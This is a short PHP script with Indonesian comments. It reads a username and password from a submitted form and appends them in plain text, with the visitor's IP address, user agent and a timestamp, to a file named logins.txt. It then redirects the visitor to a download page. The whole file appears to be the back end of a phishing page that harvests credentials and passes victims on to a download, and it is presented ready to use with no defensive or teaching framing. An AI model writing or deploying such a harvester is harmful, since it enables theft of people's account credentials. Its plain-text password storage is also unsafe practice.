<?php
// Ambil data dari form
$username = $_POST['username'];
$password = $_POST['password'];

// Ambil IP dan User-Agent
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$date = date("Y-m-d H:i:s");

// Format data
$log = "[$date][$ip][$user_agent] USERNAME: $username | PASSWORD: $password\n";

// Simpan ke file
file_put_contents("logins.txt", $log, FILE_APPEND);

// Redirect ke file download handler
header("Location: download.php");
exit;
?>
